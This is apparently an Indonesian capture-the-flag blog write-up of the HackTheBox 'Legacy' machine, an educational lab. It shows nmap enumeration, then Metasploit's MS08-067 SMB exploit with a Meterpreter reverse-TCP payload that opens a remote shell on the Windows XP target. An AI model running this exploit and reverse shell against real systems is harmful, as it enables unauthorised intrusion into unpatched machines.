---
featured_image: "/uploads/justakazh/1-jwuxdkhigs_t4yzkvmpx8q.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: paypal / saweria / buymecoffe / etc
author_web: https://blog.hackstreet.id
title: HackTheBox - Legacy
date: 2022-12-24T17:00:00.000+07:00
author: Justakazh
tags:
- '455'
- hacking
- smb
- netapi
- windows
- easy
- hackthebox
- writeup
categories: capture the flag

---
## Summary

Machine Name    : Legacy

Machine Author  : [ch4p]([Hack The Box](https://app.hackthebox.com/users/1))

Machine Difficult : Easy

Machine URL        : [Hack The Box](https://app.hackthebox.com/machines/2)



## NMAP Enumeration

Melakukan pengecheckan terhadap port yang umum

```bash
└─$ sudo nmap 10.129.227.181 
[sudo] password for punktester: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 05:47 HST
Nmap scan report for 10.129.227.181
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```

Melakukan pengecheckan versi yang digunakan terhadap port yang terbuka

```bash
┌──(punktester㉿kali)-[~/…/ctf/htb/easy/legacy]
└─$ nmap -sV 10.129.227.181 -p135,139,445  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 05:48 HST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 05:48 (0:00:12 remaining)
Nmap scan report for 10.129.227.181
Host is up (0.20s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds
zsh: segmentation fault  nmap -sV 10.129.227.181 -p135,139,445

```

> Mesin tersebut menggunakan sistem operasi windows xp. 

## 445 - SMB

saya tertarik dengan port 445 yang dimana port ini digunakan untuk Server Message Block (SMB). selanjutnya saya melakukan searching terkait potensi kerntanan pada sistem tersebut, saya mendapat sebuah artikel yang menarik tentang exploitasi pada windows xp 



https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/ 



disini saya akan mencoba melakukan exploitasi port tersebut dengan menggunakan modul metasploit **exploit/windows/smb/ms08_067_netapi** (Microsoft Server Service Relative Path Stack Corruption) Modul ini mengeksploitasi kekurangan parsing pada path kanonikalisasi dari kode NetAPI32.dll melalui Layanan Server. Modul ini juga mampu melewati NX pada beberapa sistem operasi dan paket layanan.

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.129.227.181   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.227.181:1042 ) at 2022-10-14 06:12:08 -1000

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

disini saya berhasil mendapatkan akses server tersebut dengan memanfaatkan celah MS08-067.